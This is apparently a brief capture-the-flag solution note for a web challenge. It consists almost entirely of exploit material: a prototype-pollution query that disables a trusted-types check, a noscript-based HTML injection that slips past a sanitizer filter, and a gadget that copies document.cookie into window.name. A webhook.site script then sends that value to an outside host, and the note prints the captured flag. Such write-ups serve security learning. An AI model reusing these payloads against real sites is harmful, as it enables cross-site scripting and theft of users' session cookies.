@@ -1,0 +1,45 @@
+webhook.site
+	Content Type: text/html
+	Response Body:
+		<body>
+		<script>
+		fetch(`?flag=${window.name}`);
+		</script>
+		</body>
+
+http://sosafewebsite.peykar.io:7070/report
+	Report http://ab5662c391a1.ngrok.io/exp.html
+
+
+flag=S4CTF{0hhhhh_y0u_r34lly_byp4553d_c5p_4nd_7ru573d_7yp35??}
+
+
+
+=============== Why ===============
+Prototype Pollution
+http://sosafewebsite.peykar.io:7070/?wow={"name":{"__proto__":{"__proto__":{"constructor":{"getOwnPropertyNames":"B"}}}}}
+	Object.getOwnPropertyNames => "B"
+	support_trusted() => false
+
+<noscript><img/id="</noscript><img><iframe/srcdoc='HTMLINJ'></iframe><meta/http-equiv='refresh'/content='30;url=http://example.com' />"></noscript>
+	
+In customFilter
+	el = <noscript><img/id="</noscript><img><iframe/srcdoc='HTMLINJ'></iframe><meta/http-equiv='refresh'/content='60;url=http://example.com' />"></noscript>
+
+	el = <img id="</noscript><img><iframe/srcdoc='HTMLINJ'></iframe><meta/http-equiv='refresh'/content='60;url=http://example.com' />">
+
+	attr = id="</noscript><img><iframe/srcdoc='HTMLINJ'></iframe><meta/http-equiv='refresh'/content='60;url=http://example.com' />"
+
+
+In html => XSS
+	<span id="vname">
+		<noscript><img id="</noscript>
+		<img>
+		<iframe srcdoc="HTMLINJ"></iframe><meta http-equiv="refresh" content="60;url=http://example.com">
+		"&gt;
+	</span>
+
+
+debug.js
+	window[settings[0].clear][settings[1].face] = window[settings[2].code][settings[3].accept];
+	=> window['parent']['name'] = window['document']['cookie'];
